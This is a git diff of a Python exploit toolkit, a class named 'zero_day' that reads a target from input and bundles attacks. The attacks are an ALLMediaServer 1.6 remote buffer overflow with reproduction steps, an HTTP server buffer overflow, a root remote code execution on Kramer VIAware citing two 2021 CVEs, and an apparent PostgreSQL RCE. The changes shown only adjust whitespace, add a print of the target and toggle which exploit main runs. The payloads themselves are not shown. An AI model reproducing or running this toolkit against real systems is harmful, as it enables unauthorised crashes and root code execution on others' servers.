@@ -47,7 +47,6 @@ class zero_day:
         zday.target = input()
 
 # Description: ALLMediaServer 1.6 Remote Buffer Overflow
- 
 # Steps to reproduce:
 # 1. - ALLMediaServer 1.6 listening on port 888 or can be changed to 878
 # 2. - Run the Script from remote TCP/IP
@@ -65,6 +64,7 @@ class zero_day:
         except socket.error as msg:
             print("")
             print ("Couldnt connect with Mediaserver - Crashed")
+
 #HTTP Server buffer overflow - works only for 3.06 
     def http_server_buffer_verflow(zday):
         '''
@@ -80,14 +80,13 @@ class zero_day:
         except ConnectionError as e:
             print("Crash")
 
-
-
 #Remote Code Execution as Root on KRAMER VIAware
 # CVE : CVE-2021-35064, CVE-2021-36356
 # Software Link: https://www.kramerav.com/us/product/viaware
 
     def writeFile(zday):
         #zero_day.set_target()
+        print(zday.target)
         headers = {
         "Host": f"{zday.target}",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
@@ -220,8 +219,11 @@ if __name__ == "__main__":
     #track.init_main()
     zeroday = zero_day()
     #zeroday.remote_code_execution_as_root_on_KRAMER_VIAware()
+    #zeroday.set_target()
+    #zeroday.http_server_buffer_verflow()
+    #zeroday.set_postgreSQL_target()
     #zeroday.set_postgreSQL_target()
     #zeroday.postgreSQL_rce()
-    zeroday.allmedia_buffer_overflow()
+    #zeroday.allmedia_buffer_overflow()
 
     #zeroday.http_server_buffer_verflow()
